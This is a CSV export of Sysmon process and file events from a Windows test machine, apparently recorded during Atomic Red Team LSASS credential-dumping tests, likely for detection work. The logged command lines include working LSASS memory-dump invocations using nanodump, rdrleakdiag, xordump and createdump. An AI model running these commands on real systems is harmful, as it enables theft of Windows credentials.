Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,EventID,EventRecordID,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""%%temp%%\SilentProcessExit""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19568,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-469c-658c-b701-000000000f00},3588,10300,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:32.5744531Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:32.573,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:32.5744531Z""/>
      
            
      <EventRecordID>19568</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:32.573</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-469c-658c-b701-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10300</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""%%temp%%\SilentProcessExit""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\rdrleakdiag.exe"" /p 804 /o C:\Users\User\AppData\Local\Temp\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft Windows Resource Leak Diagnostic,,,,,,1,19567,10.0.22621.1 (WinBuild.160101.0800),"MD5=B3C8CCF3ABC6FF9A3D11184CC327CCDF,SHA256=277F93C69B3E1780D348EAA7FFAA88F7ACAE571726098B61CBF2530EDB62DD2F,IMPHASH=BBAEDDB424D5E6AD0FEA37AAAE4FA16C",C:\Windows\System32\rdrleakdiag.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,RdrLeakDiag.exe,"""powershell.exe"" & {if (Test-Path -Path \""""$env:SystemRoot\System32\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\System32\rdrleakdiag.exe\""""
  } elseif (Test-Path -Path \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""""
  } else {
      $binary_path = \""""File not found\""""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""""$env:TEMP\t1003.001-13-rdrleakdiag\"""")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-469a-658c-b401-000000000f00},7096,WINDEV2309EVAL\User,{f57bd86a-469c-658c-b601-000000000f00},3588,10332,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:32.3568090Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:32.354,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:32.3568090Z""/>
      
            
      <EventRecordID>19567</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:32.354</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-469c-658c-b601-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10332</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\rdrleakdiag.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Microsoft Windows Resource Leak Diagnostic</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">RdrLeakDiag.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\System32\rdrleakdiag.exe"" /p 804 /o C:\Users\User\AppData\Local\Temp\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=B3C8CCF3ABC6FF9A3D11184CC327CCDF,SHA256=277F93C69B3E1780D348EAA7FFAA88F7ACAE571726098B61CBF2530EDB62DD2F,IMPHASH=BBAEDDB424D5E6AD0FEA37AAAE4FA16C</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-469a-658c-b401-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">7096</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {if (Test-Path -Path \""""$env:SystemRoot\System32\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\System32\rdrleakdiag.exe\""""
  } elseif (Test-Path -Path \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""""
  } else {
      $binary_path = \""""File not found\""""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""""$env:TEMP\t1003.001-13-rdrleakdiag\"""")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
&amp; $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\""""}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:31.049,,,,,,,,11,19566,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-469a-658c-b401-000000000f00},3588,7096,,,,,,-,,,,,,2023-12-27T15:45:31.0533959Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pk1omy2u.tpi.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:31.049,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:31.0533959Z""/>
      
            
      <EventRecordID>19566</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:31.049</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-469a-658c-b401-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7096</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_pk1omy2u.tpi.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:31.049</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {if (Test-Path -Path \""""$env:SystemRoot\System32\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\System32\rdrleakdiag.exe\""""
  } elseif (Test-Path -Path \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""""
  } else {
      $binary_path = \""""File not found\""""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""""$env:TEMP\t1003.001-13-rdrleakdiag\"""")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\""""}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19565,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-469a-658c-b401-000000000f00},3588,7096,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:30.9463130Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:30.945,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:30.9463130Z""/>
      
            
      <EventRecordID>19565</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:30.945</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-469a-658c-b401-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">7096</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {if (Test-Path -Path \""""$env:SystemRoot\System32\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\System32\rdrleakdiag.exe\""""
  } elseif (Test-Path -Path \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"""") {
      $binary_path = \""""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""""
  } else {
      $binary_path = \""""File not found\""""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""""$env:TEMP\t1003.001-13-rdrleakdiag\"""")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
&amp; $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\""""}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:29.783,,,,,,,,11,19564,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4699-658c-b201-000000000f00},3588,4004,,,,,,-,,,,,,2023-12-27T15:45:29.7898504Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_14sfci4n.qhv.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:29.783,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:29.7898504Z""/>
      
            
      <EventRecordID>19564</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:29.783</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4699-658c-b201-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4004</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_14sfci4n.qhv.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:29.783</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19563,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4699-658c-b201-000000000f00},3588,4004,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:29.6830851Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:29.681,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:29.6830851Z""/>
      
            
      <EventRecordID>19563</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:29.681</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4699-658c-b201-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">4004</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:28.295,,,,,,,,11,19562,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4698-658c-b001-000000000f00},3588,2240,,,,,,-,,,,,,2023-12-27T15:45:28.2987727Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wglyld4p.1is.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:28.295,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:28.2987727Z""/>
      
            
      <EventRecordID>19562</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:28.295</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4698-658c-b001-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">2240</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wglyld4p.1is.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:28.295</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {$exePath =  resolve-path \""""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe\""""
& \""""$exePath\"""" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19561,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4698-658c-b001-000000000f00},3588,2240,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:28.1908380Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:28.189,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:28.1908380Z""/>
      
            
      <EventRecordID>19561</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:28.189</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4698-658c-b001-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">2240</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {$exePath =  resolve-path \""""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe\""""
&amp; \""""$exePath\"""" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
